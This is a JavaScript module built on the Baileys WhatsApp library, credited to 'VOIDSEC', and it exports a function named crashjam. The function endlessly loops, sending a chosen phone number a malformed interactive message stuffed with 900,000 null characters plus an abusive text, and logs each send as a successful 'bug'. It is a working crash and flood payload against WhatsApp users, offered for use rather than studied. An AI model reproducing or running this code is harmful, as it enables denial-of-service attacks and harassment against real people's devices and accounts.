/*
 * © 2026 Legend Bahirava (VOIDSEC)
 *
 * ⚠️ COPYRIGHT NOTICE
 * This source code is protected under copyright law.
 * Any form of re-uploading, recoding, modification,
 * selling, or redistribution WITHOUT explicit permission
 * from the original author is strictly prohibited.
 *
 * ❌ NO CREDIT = NO PERMISSION
 * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
 *
 * ✔️ Usage or modification is allowed ONLY
 * with prior permission and proper credit.
 *
 * OFFICIAL LINKS (ONLY):
 * YouTube   : https://www.youtube.com/@bahiravabahirava-e1p5m
 * Instagram : LG_Bahirava
 * Telegram  : https://t.me/LG_BAHIRAVA
 * WhatsApp  : +94704703791
 *
 * Violations may result in DMCA takedown
 * or termination of the Telegram bot.
 */

const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto')

async function crashjam(SYxS7, target) {
  while (true) {
    try {   
      const Andros = {
        groupStatusMessageV2: {
          message: {
            interactiveResponseMessage: {                     
              body: {
                text: "Fuck You Man SYED HACKER Come Back ?",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "cta_url",
                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                version: 3
              }
            }
          }
        }
      };

      await SYxS7.relayMessage(target, Andros, { 
        participant: { jid: target } 
      });
      
      console.log(`Andros Bugs Succes Send To Numbers ${target}`);

      await new Promise(resolve => setTimeout(resolve, 1500));

    } catch (e) {
      console.log("❌ Error AndroS Bugsss:", e);
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
  }
}
module.exports = { crashjam };
